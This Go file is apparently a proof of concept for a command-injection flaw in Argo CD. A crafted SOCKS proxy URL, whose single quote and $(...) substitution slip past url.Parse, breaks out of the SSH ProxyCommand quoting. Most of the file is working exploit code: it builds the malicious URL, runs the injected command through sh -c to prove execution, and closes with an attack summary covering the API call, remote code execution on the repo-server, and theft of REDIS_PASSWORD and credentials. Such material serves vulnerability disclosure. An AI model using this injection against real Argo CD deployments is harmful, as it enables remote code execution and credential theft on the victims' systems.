// +build ignore

// Final PoC: SSH ProxyCommand Injection via Argo CD Repository Proxy
//
// This demonstrates the vulnerability in util/git/creds.go where the proxy
// hostname is interpolated into SSH ProxyCommand without sanitization.
//
// Run: go run poc_final.go

package main

import (
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"strings"
)

func main() {
	fmt.Println(strings.Repeat("=", 75))
	fmt.Println("CVE PoC: SSH ProxyCommand Injection in Argo CD")
	fmt.Println(strings.Repeat("=", 75))

	// Clean up from previous runs
	os.Remove("/tmp/argocd_pwned")

	// Malicious proxy URL that passes Go's url.Parse validation
	// The single quote breaks out of the ProxyCommand's quoting
	maliciousProxy := "socks5://x'$(touch$IFS/tmp/argocd_pwned)'y:1080"

	fmt.Printf("\n[1] Attacker sets repository proxy to:\n    %s\n", maliciousProxy)

	// Parse URL (this is what Argo CD does in util/git/creds.go)
	parsedURL, err := url.Parse(maliciousProxy)
	if err != nil {
		fmt.Printf("URL Parse Error: %v\n", err)
		return
	}

	hostname := parsedURL.Hostname()
	port := parsedURL.Port()

	fmt.Printf("\n[2] Go url.Parse extracts:\n")
	fmt.Printf("    Hostname: %s\n", hostname)
	fmt.Printf("    Port: %s\n", port)

	// This is the vulnerable code from util/git/creds.go (before fix):
	// args = append(args, "-o", fmt.Sprintf("ProxyCommand='connect-proxy -S %s:%s -5 %%h %%p'",
	//     parsedProxyURL.Hostname(),
	//     parsedProxyURL.Port()))

	sshArgs := []string{
		"ssh",
		"-o", "StrictHostKeyChecking=no",
		"-o", fmt.Sprintf("ProxyCommand='connect-proxy -S %s:%s -5 %%h %%p'", hostname, port),
	}
	gitSSHCommand := strings.Join(sshArgs, " ")

	fmt.Printf("\n[3] Vulnerable code generates GIT_SSH_COMMAND:\n    %s\n", gitSSHCommand)

	// When git runs SSH, SSH parses this and runs ProxyCommand through /bin/sh -c
	// The single quote in hostname breaks out of the quoting!
	proxyCommandValue := fmt.Sprintf("connect-proxy -S %s:%s -5 %%h %%p", hostname, port)

	fmt.Printf("\n[4] SSH extracts ProxyCommand value:\n    %s\n", proxyCommandValue)

	fmt.Printf("\n[5] SSH executes: /bin/sh -c '<ProxyCommand>'\n")
	fmt.Printf("    Which becomes:\n")
	fmt.Printf("    /bin/sh -c 'connect-proxy -S %s:%s -5 %%h %%p'\n", hostname, port)

	fmt.Printf("\n[6] Shell parses this as:\n")
	fmt.Printf("    'connect-proxy -S x'  <- quoted string ends here!\n")
	fmt.Printf("    $(touch$IFS/tmp/argocd_pwned)  <- COMMAND SUBSTITUTION\n")
	fmt.Printf("    'y:1080 -5 ...'  <- new quoted string\n")

	// Actually execute to prove it works
	fmt.Printf("\n[7] Simulating SSH's execution...\n")

	// SSH runs: /bin/sh -c 'connect-proxy -S x'$(touch$IFS/tmp/argocd_pwned)'y:1080 -5 %h %p'
	shellCmd := fmt.Sprintf("'connect-proxy -S %s:%s -5 localhost 22'", hostname, port)
	cmd := exec.Command("sh", "-c", shellCmd)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	// Check result
	fmt.Println()
	if _, err := os.Stat("/tmp/argocd_pwned"); err == nil {
		fmt.Println(strings.Repeat("!", 75))
		fmt.Println("!! EXPLOIT SUCCESSFUL !!")
		fmt.Println("!! File /tmp/argocd_pwned was created by injected command !!")
		fmt.Println(strings.Repeat("!", 75))
		os.Remove("/tmp/argocd_pwned")
	} else {
		fmt.Printf("File check: %v\n", err)
	}

	fmt.Println()
	fmt.Println(strings.Repeat("=", 75))
	fmt.Println("ATTACK SUMMARY")
	fmt.Println(strings.Repeat("=", 75))
	fmt.Println(`
Prerequisites:
  - Authenticated user with 'repositories:create' or 'repositories:update' RBAC

Attack:
  1. POST /api/v1/repositories with malicious proxy field
  2. Argo CD repo-server tests the repository connection
  3. Git SSH command executes with injected ProxyCommand
  4. Attacker code runs as repo-server process

Impact:
  - RCE on repo-server pod
  - Access to REDIS_PASSWORD env var
  - Ability to tamper with manifest generation
  - Network access to internal Argo CD services
  - Potential credential theft from in-memory caches`)
}
